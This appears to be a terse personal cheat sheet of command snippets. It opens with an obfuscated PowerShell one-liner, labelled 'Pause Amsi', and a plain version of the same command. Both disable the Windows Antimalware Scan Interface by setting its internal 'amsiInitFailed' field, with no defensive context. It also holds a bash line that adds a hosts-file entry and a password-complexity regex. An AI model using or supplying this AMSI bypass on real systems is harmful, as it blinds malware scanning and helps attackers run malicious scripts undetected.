
Pause Amsi

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."getfiElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sETVaLUE"( ${nULl},${tRuE} )
```

Past Command
```powershell
[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)
```

```bash
echo "$IP $DOMAINSTR" | sudo tee -a /etc/hosts
```

Regex
For  >= 8 character containing atleast one of each: uppercase letter, lowercase letter and digits
```
(/^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[0-9a-zA-Z]{8,}$/)
```